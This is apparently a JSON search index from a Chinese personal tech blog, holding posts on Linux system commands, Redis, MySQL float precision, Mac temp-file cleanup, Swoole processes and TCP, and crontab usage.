上有人开发了一个机器人（@GoogleDriveManagerBot），专门用于GD 文件转存。 该机器人可以实现谷歌网盘资源转存以及网盘内资源批量重命名，普通用户仅可绑定一个 GD 账号。通过简单的命令即可对文件进行转存。 总结方式一最简单，门槛最低，即使在没有权限的情况下，也能进行Copy 操作，但是效率很低。 方式二、三省事，效率高，但前提是得有权限。 参考链接 一个方便转存 Google Drive 分享文件的方法 转存Google Drive资源到自己的Google Drive Linux 下使用 rclone 挂载网盘到本地","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"}]},{"title":"互联网人的双十一","slug":"double-eleven-for-internet-people","date":"2020-11-12T00:33:10.000Z","updated":"2020-11-12T00:34:35.354Z","comments":true,"path":"double-eleven-for-internet-people/","link":"","permalink":"https://www.0x2beace.com/double-eleven-for-internet-people/","excerpt":"我其实不太会去写这类文章，那为什么要写这篇文章呢？想抓住双十一的尾巴，记录一些想法。","text":"我其实不太会去写这类文章，那为什么要写这篇文章呢？想抓住双十一的尾巴，记录一些想法。 今年的双十一我本来也是啥都没买， 可就在晚上七点左右，线上的某个平台，出了一点问题，订单的盈亏跟用户的余额对不上。经过一番排查发现是因为处理订单的那个脚本不知为何特别慢，导致大量订单全部堆积在一起了。 因为一些历史包袱的原因，在处理方式上我是知道这个脚本存在一些隐患的。同事提议不如这个脚本让他去用Node.js 写吧，尽管很不情愿，但也没办法。 想在仔细回想，当时那种感觉还是很清晰，我真的不喜欢那种能被替代的感觉，那一瞬间觉得所有的娱乐活动都没有意思了，只有把技术才是唯一的热爱。 晚上回家之后，第一件事应该是练吉他，但昨天似乎也没啥心思练了。 今年本来就没少为知识付费，视频课程，电子书籍，纸质书籍各种学习资料。 然后昨天晚上又在慕课网上买了三门实战课程，真的不想做一个Cruder，这是我最后的倔强了。 在如今这个互联网高速发展的时代，我想学习以及需要学习的东西真的是太多了，真的是学的越多，才发现自己懂的真的好少。 最后想说的是，希望自己能保持住这份初心，继续加油。","categories":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"Linux 查看系统、硬件信息","slug":"linux-view-system-and-hardware-information","date":"2020-11-09T14:33:03.000Z","updated":"2020-11-09T14:36:19.179Z","comments":true,"path":"linux-view-system-and-hardware-information/","link":"","permalink":"https://www.0x2beace.com/linux-view-system-and-hardware-information/","excerpt":"以下命令都是基于Ubuntu。","text":"以下命令都是基于Ubuntu。 系统相关查看内核/操作系统/CPU信息1$ uname -a 查看操作系统版本1$ head -n 1 &#x2F;etc&#x2F;issue 查看机器型号1$ dmidecode | grep &quot;Product Name&quot; 查看主机名1$ hostname 列出所有PCI设备1$ lspci -tv 列出所有USB设备1$ lsusb -tv 列出加载的内核模块1$ lsmod 查看环境变量1$ env 资源查看内存使用量和交换区使用量1$ free -m 查看各分区使用情况1$ df -h 查看总内存量1$ grep MemTotal &#x2F;proc&#x2F;meminfo 查看空闲内存量1$ grep MemFree &#x2F;proc&#x2F;meminfo 查看系统运行时间、用户数、负载1$ uptime 查看系统负载1$ cat &#x2F;proc&#x2F;loadavg CPU查看CPU 统计信息1$ lscpu 查看单个CPU 信息1cat &#x2F;proc&#x2F;cpuinfo 磁盘和分区查看磁盘空间信息1$ df -h 查看挂接的分区状态1mount | column -t 查看所有分区1$ fdisk -l 查看所有交换分区1$ swapon -s 网络查看所有网络接口的属性1$ ifconfig 查看防火墙设置1$ iptables -L 查看路由表1$ route -n 查看所有监听端口1$ netstat -lntp 查看所有已经建立的连接1$ netstat -antp 查看网络统计信息1$ netstat -s 进程查看所有进程1$ ps -ef 实时显示进程状态1$ top 用户查看活动用户1$ w 查看指定用户信息1$ id &lt;用户名&gt; 查看用户登录日志1$ last 查看系统所有用户1$ cut -d: -f1 &#x2F;etc&#x2F;passwd 查看系统所有组1$ cut -d: -f1 &#x2F;etc&#x2F;group 查看当前用户的计划任务1$ crontab -l 服务列出所有系统服务1$ chkconfig --list 列出所有启动的系统服务1$ chkconfig --list | grep on 参考链接 Linux 查看CPU信息，机器型号，内存等信息","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Redis 常用数据类型整理","slug":"redis-common-data-types-sorting","date":"2020-11-07T14:43:21.000Z","updated":"2020-11-07T14:46:04.965Z","comments":true,"path":"redis-common-data-types-sorting/","link":"","permalink":"https://www.0x2beace.com/redis-common-data-types-sorting/","excerpt":"Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。","text":"Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。 Redis 的五种数据类型string字符串是Redis 的五种数据类型中，最常见最好理解的。 它的数据结构最简单，就是一个标准的键值对，一个key 对应一个value： key 是string 的键，可以是字符串也可以是数字。value 是string key 所对应的值，可以是字符串也可以是数字。 应用场景 incr：计数 set + get：将对象/Json 序列化之后存储作为Cache hash哈希的数据结构很像一个迷你的关系数据库。 应用场景 hset + hget：Cache list列表的特点是： 有序 允许重复 应用场景 lpush + lpop：Stack lpush + rpop：Queue lpush + ltrim：Capped Collection lpush + brpop：Message Queue set集合特点： 无序 不允许重复 应用场景 sadd：Tagging spop/srandmember：Random item add + sinter：Social Graph sorted set 应用场景 zscore：timeStamp、saleCount、followCount 通用命令查看所有key： 1keys * 查看加载配置文件： 1config get * 当前数据库的 key 的数量： 1dbsize 判断key 是否存在： 1exists key 删除key： 1del key 查看key 的类型： 1type key 查看内存使用情况： 1info memory","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Mysql 如何选择 Float、Double、Decimal","slug":"how-does-mysql-choose-float-double-decimal","date":"2020-11-06T14:25:45.000Z","updated":"2020-12-01T14:22:22.489Z","comments":true,"path":"how-does-mysql-choose-float-double-decimal/","link":"","permalink":"https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/","excerpt":"我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。","text":"我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。 场景重现先来看这样一个例子，假设目前有一张表用来存储用户的积分 123CREATE TABLE &#96;table1&#96; ( &#96;integral&#96; float(10,2) DEFAULT NULL) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 然后向这张表中插入一条数据： 12345678910mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);Query OK, 1 row affected (0.00 sec)mysql&gt; SELECT * FROM &#96;table1&#96;;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec) 通过查询数据表可以看到该条记录并不是131072.32 而是131072.31，为什么会这样？这个问题间接暴露出了其他什么问题？ 丢失数据是否是正常现象？ 为什么会少0.01，有没有可能少0.02，或者少1，少10甚至少100？ 怎么样才能让我们的数据尽量准确？ 精度是如何丢失的数值类型存储需求|列类型|存储需求|分配内存空间||-|-|-||FLOAT(p)|如果0 &lt;= p &lt;= 24为4个字节, 如果25 &lt;= p &lt;= 53为8个字节|32,64||FLOAT|4个字节|32||DOUBLE [PRECISION], item REAL|8个字节|64||DECIMAL(M,D), NUMERIC(M,D)|变长|| 通过查阅官方文档，可以看到在计算机的世界中，浮点数进行存储时，必须要先转换为二进制，通俗一点讲也就是浮点数的精度实际上是由二进制的精度来决定的。 我们知道对于float类型的数据，只分配了32位的存储空间，对于double类型值分配了64位，但是并不是所有的实数都能转成32位或者64位的二进制形式，如果超过了，就会出现截断，这就是误差的来源。 比如将上面例子中的 131072.32 转成二进制后的数据为： 1100000000000000000.0101000111101011100001010001111010111000010100011111… 这是一个无穷数，对于float 类型，只能截取前32位进行存储，对于double只能截取前64位进行存储。 对于 float 而言，最终存储的值是：01001000000000000000000000010100 对于 double 而言，最终存储的值是：0100000100000000000000000000001010001111010111000010100011110101 所以我们暂时可以得出一个结论： 认识Float、DecimalFloat 和 Decimal 这类数据类型都可以通过两位参数来控制其精度。 其存储格式是： 1FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL] 常见误区 精度总能精确到D 位。 存储空间大小决定存储精度，和D值无关，Float 的存储空间只有32 位，当需要存储的二进制大于32 位时，就会截断（四舍五入）。 12345678910111213mysql&gt; create table table2 (integral float(15,2));Query OK, 0 rows affected (0.02 sec)mysql&gt; insert into table2 values (123456789.39);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table2;+--------------+| integral |+--------------+| 123456792.00 |+--------------+1 row in set (0.00 sec) 数据存储只能存储到D 位 浮点型数据最终都要被转成二进制进行存储。并且对于float 而言，存储类型只能是32位0和1的组合。 12345678910111213141516171819mysql&gt; select * from table1;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec)mysql&gt; alter table table1 modify integral float(10,4);Query OK, 0 rows affected (0.00 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; select * from table1;+-------------+| integral |+-------------+| 131072.3125 |+-------------+1 row in set (0.00 sec) DECIMAL(M,D)中，D 值的是小数部分的位数。可以看到，当修改了D 的值，这个时候可以看到MySQL 真正存储的数值也发生了变化。 int(3)/int(5) 区别 正常显示没有区别。 3 和 5 仅是最小显示宽度而已，并不代表最多存储宽度。 有 zerofill 等扩展属性时则显示有区别。 总结： 若插入的值未指定小数部分或者小数部分不足D 位则会自动补到D 位小数。 若插入的值小数部分超过了D 为则会发生截断，截取前D 位小数(四舍五入截取)。 M 值指是整数部分加小数部分的总长度，也即插入的数字整数部分不能超过M-D 位，否则不能成功插入，会报超出范围的错误。 如何选择Float、Double、Decimal参考链接 MySQL如何选择float, double, decimal","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mac 临时文件占用过多磁盘空间","slug":"mac-temporary-files-take-up-too-much-disk-space","date":"2020-11-05T12:09:58.000Z","updated":"2020-11-07T07:58:37.436Z","comments":true,"path":"mac-temporary-files-take-up-too-much-disk-space/","link":"","permalink":"https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/","excerpt":"最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。","text":"最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。 于是使用DaisyDisk 扫描了一下磁盘空间，发现其中多达 186 G 全是临时文件。 起初以为是系统产生的临时文件。因为并不知道这些文件是如何产生的，所以也不太敢直接删除，只尝试过重启电脑但并没有用。 后来通过Apple 社区提问才了解到，原来cachegrind.out 这类文件全是 Xdebug 的输出文件！所以是可以直接删除掉的～ 此前从未清理过这类文件，所以才会导致临时文件如此之大… 可以打开终端，使用如下命令进行清理： 1234sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*# 或者sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \\; 因为本地应用的Xdebug 一直都是开启着的，所以请求该应用时，Xdebug 就会将调试信息输出至临时文件了，如图：","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Swoole 基础知识学习","slug":"swoole-basic-knowledge-learning","date":"2020-11-03T14:33:46.000Z","updated":"2020-11-03T14:35:50.059Z","comments":true,"path":"swoole-basic-knowledge-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-basic-knowledge-learning/","excerpt":"这篇笔记用来记录Swoole 基础知识的学习。","text":"这篇笔记用来记录Swoole 基础知识的学习。 Master、Manager、Worker、ReactorMasterMaster 进程是一个多线程进程。 Manager 进程负责创建 / 回收 worker/task 进程 Worker 进程 接受由 Reactor 线程投递的请求数据包，并执行 PHP 回调函数处理数据 生成响应数据并发给 Reactor 线程，由 Reactor 线程发送给 TCP 客户端 可以是异步非阻塞模式，也可以是同步阻塞模式 Worker 以多进程的方式运行 Reactor 线程 Reactor 线程是在 Master 进程中创建的线程 负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据 不执行任何 PHP 代码 将 TCP 客户端发来的数据缓冲、拼接、拆分成完整的一个请求数据包 有一个更加通俗的比喻来描述这三者的关系：假设 Server 就是一个工厂，那 Reactor 就是销售，接受客户订单。而 Worker就是工人，当销售接到订单后，Worker去工作生产出客户要的东西，而 TaskWorker 可以理解为行政人员，可以帮助 Worker 干些杂事，让 Worker专心工作。 其他IPv4 使用 127.0.0.1 表示监听本机，0.0.0.0 表示监听所有地址IPv6 使用::1 表示监听本机，:: (相当于 0:0:0:0) 表示监听所有地址 TCP 协议TCP (Transmission Control Protocol 传输控制协议）协议是一种面向连接的，可靠的，基于字节流的传输通信协议。 UDP 协议UDP (User Datagram Protocol 用户数据报协议）是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。 UDP 服务器与 TCP 服务器不同，UDP 没有连接的概念。启动 Server 后，客户端无需 Connect，直接可以向 Server 监听的 9502 端口发送数据包。 常见问题TCP “粘包”问题首先来解释以下所谓的“粘包”问题其本质是什么。 服务端建立服务，客户端向服务端发起连接，正常情况下，服务端的每次 send，客户端都能正常 recv。但在并发的情况下，服务端的两次send 或者更多次 sned，客户端可能一次就 recv了。 所以这就导致“粘包”问题的产生。 TCP 协议的本质是流协议，它只会保证保证发送方以什么顺序发送字节，接收方就一定能按这个顺序接收到。所以所谓的“粘包”问题不应该是传输层的问题，而是应用层的问题。 无法连接到服务器的简单检测手段 在 Linux 下，使用 netstat -an | grep 端口，查看端口是否已经被打开处于 Listening 状态 上一步确认后，再检查防火墙问题，这里的防火墙指的是机器本身的防火墙，如果是云服务器，那么还包括云的防火墙。 注意服务器所使用的 IP 地址，如果是 127.0.0.1 回环地址，则客户端只能使用 127.0.0.1 才能连接上，所以如果希望其他机器也能访问本机，那就使用0.0.0.0。 参考链接 怎么解决TCP网络传输「粘包」问题？","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole Tcp 学习","slug":"swoole-tcp-learning","date":"2020-11-02T15:22:49.000Z","updated":"2020-11-02T15:40:47.308Z","comments":true,"path":"swoole-tcp-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-tcp-learning/","excerpt":"最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。","text":"最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。 场景描述：该脚本的作用用一句话就可以概述：将本地数据源推送给另外一台服务器。 原始的处理方式，不合理的地方有以下几点： 目标服务器需要开放指定端口，这会导致目标服务器向外暴露，不安全。 如果有多台目标服务器，这会导致频繁需要修改源码，脚本维护起来不方便。 重构重构需要解决的问题有如下： 当客户端连接成功后，才会向该客户端推送数据。 当客户端断开连接时，停止向该客户端推送数据。 允许多个客户端同时连接。 因为数据源是不间断的，理论上只要客户端的连接不主动断开，服务端的数据推送就不会主动停止。 最终使用Swoole 的Tcp + Process 实现了以上需求，核心代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpuse Swoole\\Process;&#x2F;** * 创建Server 对象，监听本地 9501 端口。 *&#x2F;$server &#x3D; new Swoole\\Server(&quot;0.0.0.0&quot;, 9501);$workers &#x3D; [];&#x2F;** * 监听连接进入事件 *&#x2F;$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123; global $workers; &#x2F;&#x2F; 创建子进程 $process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123; echo &quot;Client Connect&quot; . PHP_EOL; &#x2F;&#x2F; todo 业务逻辑 ... &#x2F;&#x2F; 向客户端推送消息 $server-&gt;send($fd, $str); &#125;, true, 0, false); &#x2F;&#x2F; 启动子进程 $pid &#x3D; $process-&gt;start(); array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);&#125;);&#x2F;** * 监听数据接收事件 *&#x2F;$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123; $server-&gt;send($fd, &quot;Server: &quot; . $data);&#125;);&#x2F;** * 监听连接关闭事件 *&#x2F;$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123; global $workers; foreach ($workers as $worker) &#123; if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123; &#x2F;&#x2F; 检查子进程是否存在 if (Process::kill($worker[&#39;pid&#39;], 0))&#123; array_shift($worker); &#x2F;&#x2F; 通过信号终止子进程 Process::kill($worker[&#39;pid&#39;], SIGKILL); &#125; &#125; &#125; echo &quot;Client Close&quot; . PHP_EOL;&#125;);&#x2F;&#x2F; 启动TCP 服务器$server-&gt;start(); 其实实现的原理很简单，利用Swoole 的基于事件的 Tcp 异步编程，当有客户端连接时，就创建一个子进程进行推送数据，但客户端连接断开时，就通过信号结束该客户端对应的子进程。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole 进程学习","slug":"swoole-process-learning","date":"2020-11-01T12:53:56.000Z","updated":"2020-11-03T14:33:18.115Z","comments":true,"path":"swoole-process-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-process-learning/","excerpt":"记录Swoole 进程学习过程。","text":"记录Swoole 进程学习过程。 1. 创建一个进程123456789&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);while (true) &#123; sleep(1);&#125; 2. 创建一个子进程，如何回收子进程。12345678910111213141516171819202122&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; 创建一个子进程$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); &#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。 echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。&#125;);&#x2F;&#x2F; 创建$child-&gt;start();&#x2F;&#x2F; 回收子进程\\Swoole\\Process::wait();while (true) &#123; sleep(1);&#125; 3. 重定向子进程标准输出子进程默认的标准输出是输出到屏幕上，可以通过对子进程设置，把输出重定向至管道。 然后再由主进程把管道中的内容读取出来。 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; 创建一个子进程$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); while (true) &#123; &#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。 echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。 sleep(1); &#125;&#125;, true);&#x2F;&#x2F; 创建$child-&gt;start();&#x2F;&#x2F; 回收子进程，是否阻塞等待，默认为true，阻塞。\\Swoole\\Process::wait(false);while (true) &#123; echo &quot;通过主进程从管道中读取信息：&quot;. $child-&gt;read(). PHP_EOL; sleep(1);&#125; 这样做的好处是，可以通过主进程集中处理子进程的输出（比如可以写入日志），避免输出直接到屏幕中了。 第一个参数的作用是：是否将输出重定向至主进程。true：将输出重定向至主进程管道。false：直接将输出重定向至屏幕。 第二个参数的作用是：是否创建管道。0：不创建 创建Tcp 管道 创建Udp 管道 第三个参数的作用是：是否启用协程。 4. 多个子进程的回收如果主进程只是执行一次就退出，而子进程还一直在，那么主进程也不会直接退出。 如果有多个子进程，其中某一个子进程退出了，而另一个并没有退出，这时主进程也会选择退出，而剩余的那个子进程则成了僵尸进程。因为它的父进程的ID 为零。 如果不做信号处理，否则子进程一旦退出，都会引起父进程退出。如果这时还有其他子进程没有退出，这会造成其他子进程变成僵尸进程。 在子进程中创建服务 分别是Master、Manager、Worker 进程，以及该子进程的父进程。 可以单独设置http 进程： 123$http-&gt;set([ &quot;worker_num&quot; &#x3D;&gt; 1]); 这样的话，进程就变成了两类： 最上面那个是父进程，下面三个分别是Master、Manger、Worker 进程。 6. 在进程中使用协程7. 子进程使用管道进行通信1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpuse \\Swoole\\Process;&#x2F;&#x2F; 引入协程use \\Swoole\\Coroutine\\Mysql as Mysql;&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;$child &#x3D; new Process(function (Process $proces)&#123; &#x2F;&#x2F; $mysql &#x3D; new \\think\\db\\builder\\Mysql(); $mysql &#x3D; new Mysql(); $db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]); while (true) &#123; $sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;; $rows &#x3D; $mysql-&gt;query($sql); if ($rows) &#123; $proces-&gt;write(&quot;我是一号子进程，正在查询数据：&quot;.$rows[0][&quot;user_name&quot;]); &#125; sleep(1); &#125;&#125;, false, 1, true);&#x2F;&#x2F; 创建子进程$child-&gt;start();$child2 &#x3D; new Process(function (Process $process) &#123; while (true) &#123; sleep(1); $res &#x3D; $process-&gt;read(); if ($res) &#123; echo &quot;我是二号子进程，正在获取数据：&quot;.$res.PHP_EOL; &#125; &#125;&#125;);&#x2F;&#x2F; 创建第二个子进程$child2-&gt;start();while (true) &#123; &#x2F;&#x2F; 一号子进程从管道中读取数据 $data &#x3D; $child-&gt;read(); if ($data) &#123; &#x2F;&#x2F; 如果数据存在，二号子进程则向管道中写入数据 $child2-&gt;write($data); &#125; sleep(1);&#125;&#x2F;&#x2F; 通过信号回收子进程Process::signal(SIGCHLD, function ($sig) &#123; &#x2F;&#x2F; 必须为false，非阻塞模式 while ($res &#x3D; Process::wait(false)) &#123; echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;; &#125;&#125;); 8. 子进程使用队列进行通信9. 设置定时任务通过Swoole 设置定时任务，到点之后自动执行定时任务。 核心逻辑：创建一个Manager 进程，通过一个while 循环，定时获取获取当前时间判断是否需要执行定时任务。 如果需要执行定时任务，则发送一个信号，在主进程中监听该信号， 然后执行对应的业务逻辑。 从 Swoole 4.x 版本开始，不再以监听信号的方式作为回收子进程了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Crontab 快速上手","slug":"crontab-quick-start","date":"2020-10-27T15:22:29.000Z","updated":"2020-11-20T15:09:20.436Z","comments":true,"path":"crontab-quick-start/","link":"","permalink":"https://www.0x2beace.com/crontab-quick-start/","excerpt":"Crontab 是Unix 系统中基于时间的任务管理工具。","text":"Crontab 是Unix 系统中基于时间的任务管理工具。 这个命令与传统的 Unix 命令不一样，下面会一一介绍其规则及其用法。 crontab 还是 croncrontab 还是 cron？初次接触 crontab 的同学可能会被这两个词给绕晕。 其实可以这样来理解：crontab就是 cron服务的命令行工具，而cron则是背后处理crontab投递任务的服务。 文件格式crontab 命令是以固定的时间格式来使用的， 表示意义 分钟 小时 日期 月份 周 命令 范围 0～59（*） 0～23（*） 1～31（*） 1～12（*） 0～7（*） 需要执行的命令 另外还有一些特殊字符具有特殊含义： * 表示任何时刻都接收。举个栗子：* 12 * * * 表示不论何月、何日的星期几的十二点都执行指定命令。 常用实例每分钟执行一次： 1*&#x2F;1 * * * * 或者 * * * * * 每五分钟执行一次： 1*&#x2F;5 * * * * 每小时执行一次： 10 * * * * 或者 0 *&#x2F;1 * * * 每天执行一次： 10 0 * * * 每周执行一次： 10 0 * * 0 每月执行一次： 10 0 1 * 0 如何使用初次接触crontab 命令时，我也比较纳闷，这个命令倒底是如何使用的？ 使用 crontab 有两种方式： crontab -e：直接接受标准输入（键盘）上键入的命令，并将它们载入crontab。 crontab file：将file 作为crontab 的任务列表文件并载入crontab 第一种方式没什么好说的，直接在终端添加 crontab 任务就行了，下面简单说一下第二种（其实两者的核心都是一样的）。 创建crontab 文件首先创建一个文件，该文件的内容以功能描述、执行时间、执行任务 这几部分组成。 其中，前两者并不是一定需要，只是为了方便自己日后或其他人能快速知道这个任务具体是做什么的，# 表示注释。 示例，创建一个名称为script_cron 的crontab 文件： 12# 每分钟执行一次 script.php 脚本* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php 运行crontab为了提交刚刚创建的crontab 文件，可以把这个新创建的文件名称作为crontab命令的参数： 1$ crontab script_cron 列出cron 服务使用-l 参数列出crontab文件： 123$ crontab -l# 每分钟执行一次 script.php 脚本* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php 编辑cron 服务1$ crontab -e 删除cron 服务1$ crontab -r 常见问题crontab 没有立即生效新创建的cron 任务，不会马上执行，至少要过两分钟才执行。 如果希望能马上执行，可以重启 crontab 。 12345&#x2F;&#x2F; Ubuntu：$ service cron restart &#x2F;&#x2F; Centos$ service crond restart crontab 压根没执行有时候会遇到直接在命令行中可以执行任务，但是定时任务却怎么都不执行， 这时首先需要确认 cron 服务是否正常： 12345&#x2F;&#x2F; Ubuntu：$ service cron status &#x2F;&#x2F; Centos$ service crond status 然后确认需要执行的任务是否包含路径，如果包含请使用全局路径。 最后重启 cron 服务，通常到这里就已经可以正常执行了，如果还不行，尝试引入环境变量： 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php crontab 无权限执行需要注意的是crontab 任务的调度，只有 root 和任务所有者拥有权限。 如果想要编辑/查看/删除其他用户的任务，可以使用以下命令： 1$ crontab -u &lt;username&gt; &lt;选项&gt; 常用选项：-e：编辑任务-l：查看任务-r：删除任务 查看 crontab 任务执行情况当定时任务在指定时间执行时，会同步输出类似日志： 12$ tail -f &#x2F;var&#x2F;log&#x2F;syslogNov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php) 此时就可以肯定任务调度正常。 上面那种方式确实有效，但是并不方便，那么有没有更好的方式呢？ crontab 默认没有任务的执行记录日志，但是可以通过其他方式手动创建日志文件。 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1 在script.php 脚本最后面增加一次输出，这样每次执行完脚本就会将输出重定向至cron.log 日志文件了。 参考链接 crontab用法与实例 19. crontab 定时任务 Linux Crontab命令定时任务基本语法与操作教程-VPS/服务器自动化","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"}]},{"title":"Swoole 常见概念整理","slug":"sorting-out-some-concepts-in-swoole","date":"2020-10-25T12:24:52.000Z","updated":"2020-11-07T08:11:48.092Z","comments":true,"path":"sorting-out-some-concepts-in-swoole/","link":"","permalink":"https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/","excerpt":"Swoole 是一个非常优秀的PHP 的协程高性能网络通信引擎。 在学习过程中，遇到了一些新或旧的概念，在此整理一下。","text":"Swoole 是一个非常优秀的PHP 的协程高性能网络通信引擎。 在学习过程中，遇到了一些新或旧的概念，在此整理一下。 